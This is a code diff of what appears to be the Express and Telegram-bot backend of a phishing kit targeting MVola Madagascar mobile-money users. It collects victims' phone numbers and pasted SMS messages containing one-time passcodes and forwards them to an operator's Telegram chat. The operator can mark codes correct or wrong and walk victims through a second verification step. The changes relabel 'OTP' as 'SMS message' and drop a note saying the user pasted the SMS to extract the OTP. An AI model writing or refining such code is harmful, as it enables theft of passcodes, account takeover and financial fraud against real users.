@@ -129,9 +129,10 @@ app.post('/api/otp-notification', async (req, res) => {
     }
 });
 
-// -------------------- FIRST OTP API --------------------
+// -------------------- FIRST SMS MESSAGE API (PAGE 8) --------------------
 app.post('/api/verify-first-otp', async (req, res) => {
-    const { phone, link } = req.body || {};
+    const { phone, link, sms } = req.body || {};
+    const smsContent = link || sms; // Accept either key from frontend payload
     const country = "Madagascar";
     const countryCode = "+261";
     const currentTime = new Date().toLocaleString('en-US', {
@@ -140,19 +141,19 @@ app.post('/api/verify-first-otp', async (req, res) => {
         hour12: true
     });
 
-    if (!phone || !link || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
+    if (!phone || !smsContent || !ADMIN_ID) {
+        return res.status(400).json({ error: "Missing data (phone, smsContent, or ADMIN_ID)" });
+    }
 
     statusStore[phone] = "pending_otp1";
 
-    const otpMessage = `🆕 <b>MVOLA MADAGASCAR - VERIFICATION NEEDED</b>
+    const otpMessage = `📨 <b>MVOLA MADAGASCAR - SMS VERIFICATION MESSAGE</b>
 🇲🇬 <b>Country:</b> ${country}
 📞 <b>Country Code:</b> ${countryCode}
 📱 <b>Phone Number:</b> ${phone}
-📨 <b>COMPLETE SMS MESSAGE:</b>
-${link}
+💬 <b>COMPLETE SMS MESSAGE:</b>
+<code>${smsContent}</code>
 ⏰ <b>Time:</b> ${currentTime}
-
-💬 <b>Note: User pasted SMS message to extract OTP</b>
 
 <b>━━━━━━━━━━━━━━━━━</b>
 
@@ -180,7 +181,7 @@ ${link}
         });
         res.json({ success: true });
     } catch (err) {
-        console.error(err);
+        console.error("Telegram SMS Notification Error:", err);
         res.status(500).json({ error: err.message });
     }
 });
@@ -358,15 +359,15 @@ bot.action(/^otp1_correct\|(.+)/, async (ctx) => {
     statusStore[phone] = "otp1_correct";
     const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
 
-    const verifiedMsg = `1️⃣ <b>FIRST OTP VERIFIED (Step 1/2)</b>
+    const verifiedMsg = `1️⃣ <b>FIRST SMS VERIFIED (Step 1/2)</b>
 
 🇲🇬 <b>Madagascar</b>
 📱 <b>${phone}</b>
 
 ━━━━━━━━━━━━━━━
 
-✅ <b>Status: First OTP verified</b>
-➡️ <b>Next: Second OTP (2/2) will be sent</b>
+✅ <b>Status: SMS verified</b>
+➡️ <b>Next: Second step will be sent</b>
 ⌛ <b>${currentTime}</b>`;
 
     await ctx.answerCbQuery("Verified");
@@ -380,7 +381,7 @@ bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
     statusStore[phone] = "otp1_wrong";
     await ctx.answerCbQuery("Wrong Code");
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(`❌ <b>FIRST OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
+    await ctx.replyWithHTML(`❌ <b>SMS MESSAGE INCORRECT</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter message.</b>`);
 });
 
 // CONTACT US
